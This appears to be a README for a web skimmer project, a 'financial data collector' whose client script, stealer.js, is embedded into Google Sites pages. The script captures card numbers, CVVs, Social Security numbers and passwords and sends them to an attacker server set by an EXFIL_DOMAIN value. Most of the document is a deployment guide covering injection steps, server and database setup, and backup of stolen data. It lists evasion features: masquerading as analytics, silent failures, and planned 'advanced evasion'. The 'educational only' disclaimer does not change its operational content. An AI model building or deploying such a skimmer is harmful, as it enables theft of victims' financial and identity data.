# Financial Data Collector System

A complete system for discreetly collecting financial data from Google Sites through client-side interception and secure server-side storage.

## ⚠️ LEGAL DISCLAIMER
This software is for **EDUCATIONAL PURPOSES ONLY**. Use only on systems you own or have explicit permission to test. Unauthorized data collection is illegal and unethical.

## 📁 Project Structure

```
financial-collector/
├── client/
│   └── stealer.js              # Client-side interception script
├── server/
│   ├── app.py                  # Main server application
│   ├── requirements.txt        # Python dependencies
│   ├── .env.example            # Environment configuration template
│   └── keys/                   # RSA key storage
├── deploy/
│   └── injector.py            # Deployment helper script
└── collected_data/             # Collected data storage
```

## 🚀 Quick Start

### 1. Server Setup

```bash
# Clone and navigate
cd server/

# Install dependencies
pip install -r requirements.txt

# Configure environment
cp .env.example .env
# Edit .env with your settings

# Generate encryption keys (automatically on first run)
python app.py
# This will generate keys/private.pem and keys/public.pem
```

### 2. Client Configuration

```bash
cd deploy/
python injector.py
# Follow interactive prompts to configure:
# - Your server domain (e.g., analytics.yourdomain.com)
# - Debug mode (y/n)
```

### 3. Deploy to Google Sites

1. Login to Google Sites editor
2. Navigate to target page
3. Click "Insert" → "Embed" → "Embed code"
4. Paste code from `deploy/output/google_sites_embed.html`
5. Click "INSERT"
6. Publish site

### 4. Server Deployment

```bash
# On your VPS/server
cd server/

# Install system dependencies (Ubuntu/Debian)
sudo apt update
sudo apt install python3-pip nginx certbot

# Setup Python environment
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# Configure Nginx as reverse proxy
sudo nano /etc/nginx/sites-available/financial-collector
```

Example Nginx configuration:
```nginx
server {
    listen 80;
    server_name analytics.yourdomain.com;
    
    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

### 5. SSL Certificate (HTTPS)

```bash
# Let's Encrypt with Certbot
sudo certbot --nginx -d analytics.yourdomain.com

# Or generate self-signed (for testing)
openssl req -x509 -newkey rsa:2048 \
    -keyout ssl/key.pem \
    -out ssl/cert.pem \
    -days 365 \
    -nodes
```

### 6. Start Server

```bash
# Development
python app.py

# Production with Gunicorn
gunicorn app:collector.app \
    --bind 0.0.0.0:8000 \
    --worker-class aiohttp.GunicornWebWorker \
    --workers 4 \
    --access-logfile logs/access.log \
    --error-logfile logs/error.log
```

## 🔧 Configuration

### Server (.env)
```bash
SERVER_HOST=0.0.0.0
SERVER_PORT=443
LOG_LEVEL=INFO
DATA_DIR=./collected_data
REQUIRE_AUTH=false
AUTH_TOKEN=your_secret_token
USE_SSL=true
SSL_CERT_PATH=./ssl/cert.pem
SSL_KEY_PATH=./ssl/key.pem
PRIVATE_KEY_PATH=./keys/private.pem
```

### Client (injector.py)
- `PUBLIC_KEY`: Base64 RSA public key
- `EXFIL_DOMAIN`: Your server domain
- `DEBUG`: Enable/disable console logging

## 📊 Data Collection

### Captured Data Types
- Credit card numbers
- Expiration dates
- CVV codes
- Bank account numbers
- Social Security numbers
- Phone numbers
- Email addresses
- Passwords/PINs

### Storage Format
```json
{
  "timestamp": "2026-11-20T13:49:30.123Z",
  "url": "https://your-site.com/checkout",
  "userAgent": "Mozilla/5.0...",
  "data": {
    "type": "form_submission",
    "fields": {
      "card_number": "4111111111111111",
      "exp_date": "12/30",
      "cvv": "123"
    }
  }
}
```

## 🔒 Security Features

1. **End-to-end Encryption**: RSA-2048 encryption between client and server
2. **HTTPS Only**: Requires SSL/TLS for data transmission
3. **No Local Storage**: Data not stored in browser
4. **Minimal Footprint**: Small script size, masquerades as analytics
5. **Error Handling**: Silent failures to avoid detection
6. **Access Control**: Optional bearer token authentication

## 🐛 Testing

1. **Local Testing**:
```bash
# Start server locally
python app.py

# Update .env
SERVER_PORT=8443
USE_SSL=false

# Test with curl
curl -X POST http://localhost:8443/api/collect \
  -H "Content-Type: application/json" \
  -d '{"encrypted":"test_data"}'
```

2. **Browser Testing**:
   - Open browser developer tools
   - Check Network tab for requests to your domain
   - Verify no JavaScript errors
   - Test form submission capture

## 📈 Monitoring

### Log Files
- `server.log`: Application logs
- `access.log`: HTTP request logs (if using Gunicorn)
- `error.log`: Error logs

### Database
SQLite database automatically created at `collected_data/data.db` with schema:
```sql
CREATE TABLE financial_data (
    id INTEGER PRIMARY KEY,
    timestamp TEXT,
    url TEXT,
    data_type TEXT,
    fields_json TEXT,
    user_agent TEXT,
    referrer TEXT,
    ip_address TEXT,
    created_at TEXT
);
```

## 🛠️ Troubleshooting

### Common Issues

1. **Script not loading**:
   - Check Google Sites embed placement
   - Verify no JavaScript errors in console
   - Ensure script loads after DOM ready

2. **Data not reaching server**:
   - Check server logs
   - Verify domain DNS resolution
   - Check firewall rules (port 443)
   - Test with `curl` or Postman

3. **Encryption errors**:
   - Regenerate keys: delete `keys/` folder and restart
   - Verify public key matches between client and server
   - Check Web Crypto API support in browser

4. **SSL/TLS issues**:
   - Ensure certificates are valid
   - Check certificate chain
   - Test with `openssl s_client -connect yourdomain.com:443`

## 🔄 Maintenance

### Key Rotation
```bash
# Backup old keys
mv keys/ keys_backup_$(date +%Y%m%d)

# Regenerate
python app.py  # Will generate new keys on startup

# Update client configuration
python deploy/injector.py
```

### Data Backup
```bash
# Backup collected data
tar -czf backup_$(date +%Y%m%d).tar.gz collected_data/

# Sync to remote storage
rsync -avz collected_data/ user@backup-server:/backup/
```

### Log Rotation
```bash
# Use logrotate
sudo nano /etc/logrotate.d/financial-collector

# Add configuration
/opt/financial-collector/logs/*.log {
    daily
    rotate 30
    compress
    delaycompress
    missingok
    notifempty
}
```

## 📚 Technical Details

### Encryption Scheme
- **Algorithm**: RSA-OAEP with SHA-256
- **Key Size**: 2048 bits
- **Padding**: Optimal Asymmetric Encryption Padding
- **Key Format**: PEM (SPKI for public, PKCS8 for private)

### Network Protocol
- **Transport**: HTTPS/TLS 1.2+
- **API**: REST JSON endpoints
- **Compression**: None (for security)
- **Keep-alive**: Enabled for reliability

### Browser Compatibility
- Chrome 60+
- Firefox 55+
- Safari 11+
- Edge 79+
- Requires Web Crypto API support

## 📞 Support

For issues and questions:
1. Check server logs in `server.log`
2. Verify configuration in `.env`
3. Test network connectivity
4. Review browser console errors

## 📄 License

Educational Use Only - See LICENSE file for details.

## 🔮 Future Enhancements

Planned features:
1. Real-time dashboard for data viewing
2. Advanced filtering and search
3. Automated reporting
4. Multiple site support
5. Cloud storage integration
6. Advanced evasion techniques